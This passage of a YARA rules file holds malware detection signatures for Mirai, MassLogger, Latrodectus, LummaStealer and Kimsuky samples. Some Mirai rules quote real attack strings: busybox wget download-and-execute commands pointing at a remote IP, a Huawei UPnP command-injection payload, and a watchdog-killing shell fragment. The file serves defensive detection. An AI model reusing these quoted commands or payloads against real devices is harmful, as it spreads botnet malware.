      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "01401d5c3088a1325d988538ab7250a5159bcf0d7d5a6e93366dfe059976a273"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0bf68bf7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0bf68bf7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0bf68bf762a62ef3b500a247c52f6f65bf762ad76430429306d2c3db1879e7ff"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__0d1689b6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0d1689b6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0d1689b6a7994f23b4bf5ec6e3df8a73d2789e6ca182ffddd7d63987e6de8a55"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0bd99a67 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0bd99a67.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0bd99a672cb125db5a7174ea91ee72a19a78c4070d650f72f03211f2169fec02"
   strings:
      $s1 = "/bin/systemd" fullword ascii /* score: '10.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0ecf90de {
   meta:
      description = "_subset_batch - file Mirai(signature)_0ecf90de.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ecf90de03eeeafd756586b59605714d09116ab2aae82ff70c513ae7b25f1dc3"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s3 = "/proc/self/cmdline" fullword ascii /* score: '12.00'*/
      $s4 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__060a45cf {
   meta:
      description = "_subset_batch - file Mirai(signature)_060a45cf.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "060a45cf9c37a89984c68af7f53bc533458565c10a84688aab8afc6f43e0cf26"
   strings:
      $s1 = "nothinglmao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__0ac2df27 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0ac2df27.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ac2df2704e5127accd26d293c1a0cd85a7c7a47028c60a48bdc352b46fdc338"
   strings:
      $s1 = "9.nBo:\\~" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__0ee5e3aa {
   meta:
      description = "_subset_batch - file Mirai(signature)_0ee5e3aa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ee5e3aad8658d78d8fb28bbd2f97077e03876215f96c0050907992dc08dce94"
   strings:
      $s1 = "WHIc:\\." fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0ec9e985 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0ec9e985.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ec9e985ca87f1adb666a4100753a66c12bbe28668eed44d4093624679396178"
   strings:
      $s1 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s2 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__04bd0493 {
   meta:
      description = "_subset_batch - file Mirai(signature)_04bd0493.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "04bd0493bf57aaa75154f5ae4194a3a17f02322bbcb621e2cfa5f72d9a7df843"
   strings:
      $s1 = "GET /bot.arm6 HTTP/1.0" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 4KB and
      all of them
}

rule Mirai_signature__0abde5d1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0abde5d1.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0abde5d125fd13bbac99e365d34027d52792c8e8b8f44ebab1bf7712aed54297"
   strings:
      $s1 = "cp /bin/busybox busybox; busybox wget http://46.23.108.231/mpsl    -O- > WLOPKJ; chmod 777 WLOPKJ; ./WLOPKJ selfrep.wget" fullword ascii /* score: '26.00'*/
      $s2 = "cp /bin/busybox busybox; busybox wget http://46.23.108.231/mips    -O- > NVBXUE; chmod 777 NVBXUE; ./NVBXUE selfrep.wget" fullword ascii /* score: '26.00'*/
      $s3 = "cp /bin/busybox busybox; busybox wget http://46.23.108.231/arm7    -O- > AFGHTY; chmod 777 AFGHTY; ./AFGHTY selfrep.wget" fullword ascii /* score: '26.00'*/
      $s4 = "cp /bin/busybox busybox; busybox wget http://46.23.108.231/arm5    -O- > PRTQWE; chmod 777 PRTQWE; ./PRTQWE selfrep.wget" fullword ascii /* score: '26.00'*/
      $s5 = "cp /bin/busybox busybox; busybox wget http://46.23.108.231/arm4    -O- > XKJDSA; chmod 777 XKJDSA; ./XKJDSA selfrep.wget" fullword ascii /* score: '26.00'*/
      $s6 = "/bin/busybox mount -o bind,remount,ro \"$dir\"" fullword ascii /* score: '15.00'*/
      $s7 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s8 = "# lol fuck you ducky watch me" fullword ascii /* score: '13.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s12 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s13 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _MassLogger_signature__5ba0e07214b3423072c72a6e1cb6e11f_imphash__MassLogger_signature__995cce3d6fb20b2d8af502c8788f55d7_imph_0 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, MassLogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, MassLogger(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "56ae4aa3f2fcab8f52cc534685e1d8558d75302db44938f8c88bab8f53677a5f"
      hash2 = "6518acc1ac256a5e244adce532e52a42c09f8599fc38229adb55fce4826cae85"
      hash3 = "984277311c91dbc49e63998341931c412a246899679e0797304a4ea7e88f37d6"
   strings:
      $x1 = "System.ComponentModel.Design.IDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" fullword wide /* score: '34.00'*/
      $x2 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $x3 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x4 = ":System.Private.TypeLoader.dll$System.Private.Uri" fullword ascii /* score: '31.00'*/
      $s5 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '27.00'*/
      $s6 = "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s7 = "DeleteTimerXSystem.Threading.IThreadPoolWorkItem.Execute" fullword ascii /* score: '25.00'*/
      $s8 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s9 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s10 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s11 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s12 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s13 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s14 = "Failed to allocate memory in target process" fullword wide /* score: '24.00'*/
      $s15 = "Format of the executable (.exe) or library (.dll) is invalid" fullword wide /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Latrodectus_signature__Latrodectus_signature__2c362434_1 {
   meta:
      description = "_subset_batch - from files Latrodectus(signature).msi, Latrodectus(signature)_2c362434.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f1b27d88bdb6b4d2019191b539f130edceb6b7ec16bd4131159256b4c872a8fd"
      hash2 = "2c3624344070c78c0785b5e833c0d56a5cec3f5e58ce53b9c17018d9386b7f37"
   strings:
      $x1 = "(This operation cannot be undone.)Error writing to file: [2].  Verify that you have access to that directory.Installer stopped p" ascii /* score: '81.00'*/
      $x2 = "[2]Error converting file time to local time for file: [3]. GetLastError: [2].Path: [2] is not a parent of [3].On the dialog [2] " ascii /* score: '72.00'*/
      $x3 = "e: [2]Searching for installed applicationsProperty: [1], Signature: [2]UnmoveFilesRemoving moved filesFile: [1], Directory: [9]C" ascii /* score: '67.00'*/
      $x4 = "AttributesPatchSizeFile_PatchTypeActionConditionSequenceCostFinalizeCostInitializeTableNameInstallFinalizeInstallInitializeInsta" ascii /* score: '56.00'*/
      $x5 = "odify Installation|[DlgTitleFont]Re&pairRepairButton[RepairIcon]RemoveLabelRepair Installation|[DlgTitleFont]&RemoveRemoveButton" ascii /* score: '56.00'*/
      $x6 = "ronmentStringsProgressDlgAdminWelcomeDlgAI_SET_ADMINExecuteActionExitDialogFatalErrorPrepareDlgUserExitDataUploader.dllaicustact" ascii /* score: '45.00'*/
      $x7 = "DataUploader.dll" fullword wide /* score: '34.00'*/
      $x8 = "Your original Firewall configuration will be restored.Invalid Firewall network scope: [2].There was an error registering port wi" ascii /* score: '34.00'*/
      $x9 = "C:\\JobRelease\\win\\Release\\custact\\x86\\DataUploader.pdb" fullword ascii /* score: '33.00'*/
      $x10 = "rer]\\[ProductName][APPDIR][ProductVersion]igfxSDKSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run[AppDataFolder]Intel\\igfxSDK" ascii /* score: '33.00'*/
      $x11 = "%s\\System32\\cmd.exe" fullword wide /* score: '32.00'*/
      $x12 = "[SystemFolder]msiexec.exe" fullword wide /* score: '32.00'*/
      $s13 = "Unsupported command file format. The supported file formats are: ANSI, UTF-8, Unicode Little Endian and Unicode Big Endian. The " wide /* score: '30.00'*/
      $s14 = " was an error during the SQL script execution process.ODBC Error: [2] ([3]).SQL script parse error: invalid syntax.Internal erro" ascii /* score: '29.00'*/
      $s15 = "ze cabinet file server. The required file 'CABINET.DLL' may be missing.Database: [2]. Insufficient parameters for Execute.Databa" ascii /* score: '29.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 8000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _MassLogger_signature__5ba0e07214b3423072c72a6e1cb6e11f_imphash__MassLogger_signature__995cce3d6fb20b2d8af502c8788f55d7_imph_2 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, MassLogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "56ae4aa3f2fcab8f52cc534685e1d8558d75302db44938f8c88bab8f53677a5f"
      hash2 = "6518acc1ac256a5e244adce532e52a42c09f8599fc38229adb55fce4826cae85"
   strings:
      $x1 = "System.ComponentModel.ComponentConverter, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x2 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x3 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $s4 = "NSystem.ComponentModel.TypeConverter.dll" fullword ascii /* score: '29.00'*/
      $s5 = "        publickeublickeykeytokenretargetrgetablecontentttenttypewindowsrsruntime" fullword wide /* score: '28.00'*/
      $s6 = "System.Numerics, Version=4.0.0.0, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s8 = "HSystem.ComponentModel.Primitives.dll$System.ObjectModel" fullword ascii /* score: '25.00'*/
      $s9 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s10 = "FinishStageTwo FinishStageThreeJNotifyParentIfPotentiallyAttachedTask,ProcessChildCompletion2AddExceptionsFromChildren@" fullword ascii /* score: '23.00'*/
      $s11 = ",System.Collections.dll" fullword ascii /* score: '23.00'*/
      $s12 = "nicu.dll" fullword wide /* score: '23.00'*/
      $s13 = "System.dll:System.Collections.Concurrent" fullword ascii /* score: '22.00'*/
      $s14 = "x<ReduceAlternation>g__RemoveRedundantEmptiesAndNothings|41_2d<ReduceAlternation>g__ExtractCommonPrefixText|41_3X<ReduceAlternat" ascii /* score: '22.00'*/
      $s15 = "6.2.1.0\\6.2.1+ff2056b212d34fdf7798fa8de10d1715b3d50aa9Dhttps://github.com/scriban/scriban" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5__3 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash2 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
   strings:
      $x1 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x2 = "mismatched count during itab table copymspan.sweep: bad span state after sweepout of memory allocating heap arena mapruntime: ca" ascii /* score: '49.00'*/
      $x3 = ".lib section in a.out corruptedbad write barrier buffer boundscannot assign requested addresscasgstatus: bad incoming valueschec" ascii /* score: '46.50'*/
      $x4 = "workbuf is empty initialHeapLive= spinningthreads=, p.searchAddr = : missing method DnsRecordListFreeGC assist markingGetCurrent" ascii /* score: '46.00'*/
      $x5 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing= ms clock" ascii /* score: '43.00'*/
      $x6 = "WriteProcessMemorybad manualFreeListconnection refusedfaketimeState.lockfile name too longforEachP: not donegarbage collectionid" ascii /* score: '42.00'*/
      $x7 = "address already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in readybad sweepgen in re" ascii /* score: '39.00'*/
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '38.00'*/
      $x9 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii /* score: '37.00'*/
      $x10 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dllmadvdontneedmheapSpecialmspanSpe" ascii /* score: '32.00'*/
      $x11 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii /* score: '31.00'*/
      $s12 = "apViewOfFileRegEnumKeyExWRegOpenKeyExWVirtualUnlockWriteConsoleWadvapi32.dll" fullword ascii /* score: '28.00'*/
      $s13 = "ProcessGetShortPathNameWLookupAccountSidWWSAEnumProtocolsWbad TinySizeClassdebugPtrmask.lockentersyscallblockexec format errorg " ascii /* score: '27.00'*/
      $s14 = "ime: p scheddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  found at *( gcscan" ascii /* score: '27.00'*/
      $s15 = "structure needs cleaning bytes failed with errno= to unused region of span with too many arguments GODEBUG: can not enable \"Get" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "4035d2883e01d64f3e7a9dccb1d63af5" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88__4 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec1bf2523cc8eedddae9d7d4c657f210886b9f4cb085858310d97be8dd90b33f"
      hash2 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
   strings:
      $x1 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '38.00'*/
      $s2 = "unsafe.String: len out of rangeresource temporarily unavailablesoftware caused connection abortnumerical argument out of domainC" ascii /* score: '26.50'*/
      $s3 = "runtime.mutexWaitListHead" fullword ascii /* score: '26.00'*/
      $s4 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s5 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s6 = "runtime.mapKeyError2" fullword ascii /* score: '21.00'*/
      $s7 = "runtime.mutexPreferLowLatency" fullword ascii /* score: '21.00'*/
      $s8 = "runtime.mapKeyError" fullword ascii /* score: '21.00'*/
      $s9 = "runtime.dumpTypesRec" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.dumpStacksRec" fullword ascii /* score: '20.00'*/
      $s11 = " s.sweepgen= allocCount ProcessPrng" fullword ascii /* score: '20.00'*/
      $s12 = "ntptr; runtime.fn func(); runtime.link *runtime._defer; runtime.head *internal/runtime/atomic.Pointer[runtime._defer] }]).Compar" ascii /* score: '19.00'*/
      $s13 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.heap bool; runtime.rangefunc bool; runtime.sp uintptr; runtime.pc ui" ascii /* score: '19.00'*/
      $s14 = "r spinbit mutexmin size of malloc header is not a size class boundarygcControllerState.findRunnable: blackening not enabledno go" ascii /* score: '19.00'*/
      $s15 = "mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:top gp->status is not in scan state is currently not " ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "1aae8bf580c846f39c71c05898e57e88" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__5ba0e07214b3423072c72a6e1cb6e11f_imphash__MassLogger_signature__9e1c5e753d9730385056638ab1d72c60_imph_5 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, MassLogger(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "56ae4aa3f2fcab8f52cc534685e1d8558d75302db44938f8c88bab8f53677a5f"
      hash2 = "984277311c91dbc49e63998341931c412a246899679e0797304a4ea7e88f37d6"
   strings:
      $s1 = "UnhandledUnaryHUserDefinedOpMustHaveConsistentTypesHUserDefinedOpMustHaveValidReturnTypeNLogicalOperatorMustHaveBooleanOperators" ascii /* score: '26.00'*/
      $s2 = "TargetvM:System.Security.Cryptography.CryptoConfigForwarder.#cctor" fullword ascii /* score: '25.00'*/
      $s3 = "Refresh,GetOrOpenProcessHandle@" fullword ascii /* score: '20.00'*/
      $s4 = "FGetUserDefinedBinaryOperatorOrThrowFGetUserDefinedAssignOperatorOrThrow" fullword ascii /* score: '20.00'*/
      $s5 = "8GetUserDefinedBinaryOperator" fullword ascii /* score: '20.00'*/
      $s6 = "&GetProcessShortName" fullword ascii /* score: '20.00'*/
      $s7 = "\"GetCurrentProcess" fullword ascii /* score: '20.00'*/
      $s8 = "Couldn't get process information from performance counter" fullword wide /* score: '20.00'*/
      $s9 = "(System.Text.Json.dll>System.Threading.Tasks.Parallel" fullword ascii /* score: '19.00'*/
      $s10 = "6System.Linq.Expressions.dll0Microsoft.Win32.Registry" fullword ascii /* score: '19.00'*/
      $s11 = "`System.Collections.IEqualityComparer.GetHashCodeVSystem.Collections.IEqualityComparer.Equals@" fullword ascii /* score: '18.00'*/
      $s12 = "System.Collections.Generic.IEnumerable<System.Linq.Expressions.Interpreter.InterpretedFrameInfo>.GetEnumerator@" fullword ascii /* score: '18.00'*/
      $s13 = " OpenProcessToken" fullword ascii /* score: '18.00'*/
      $s14 = "<Execute>b__7_0" fullword ascii /* score: '18.00'*/
      $s15 = "Feature requires a process identifier" fullword wide /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2975357d_MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5_6 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2975357d.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a7bdab22.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d674ac09.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2975357d5c30a76123dc34b14bdb66cbfe1b6413ce16b0f0a95ed4ef2bb6944f"
      hash2 = "a7bdab2286bade8325d6379938c78a841434f18092089d9487a80a89496548ad"
      hash3 = "d674ac095490af3430ec4ec50b1be905b1e7f690117da522c447332d78d25bb9"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "get_ReceiptID" fullword ascii /* score: '9.00'*/
      $s4 = "get_receiptWrite" fullword ascii /* score: '9.00'*/
      $s5 = "get_tablesManager" fullword ascii /* score: '9.00'*/
      $s6 = "get_ReceiptDateTime" fullword ascii /* score: '9.00'*/
      $s7 = "get_table_Products" fullword ascii /* score: '9.00'*/
      $s8 = "get_product" fullword ascii /* score: '9.00'*/
      $s9 = "get_dateTime" fullword ascii /* score: '9.00'*/
      $s10 = "get_ProductPrice" fullword ascii /* score: '9.00'*/
      $s11 = "get_gb_Products" fullword ascii /* score: '9.00'*/
      $s12 = "get_productManager" fullword ascii /* score: '9.00'*/
      $s13 = "get_ProductBarkod" fullword ascii /* score: '9.00'*/
      $s14 = "get_HowManyTable" fullword ascii /* score: '9.00'*/
      $s15 = "M- -!I" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_impha_7 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_30aaf493.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_6931da3b.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_83f4c42f.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_93b67e92.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "ec1bf2523cc8eedddae9d7d4c657f210886b9f4cb085858310d97be8dd90b33f"
      hash3 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
      hash4 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash5 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash6 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash7 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
      hash8 = "852fd8e572f18ab2f694153a8943c2ef198c2a5bf6179e7bef30c6dc79f84811"
      hash9 = "30aaf493758998d58bd9ec2b9c0e40b19a259963f777da91afe60f859f4327a3"
      hash10 = "6931da3b18f6ec11042ec36f39f00ff9e565e775147e33105655666e473badd5"
      hash11 = "83f4c42f9867e19b087e43e111f39018cc90fa2710a99947cd3f2fec69427641"
      hash12 = "93b67e925e2b9bfe548c1437a40bc558b2b598f5f9c40c34c7c372814e8b89f4"
      hash13 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash14 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash15 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
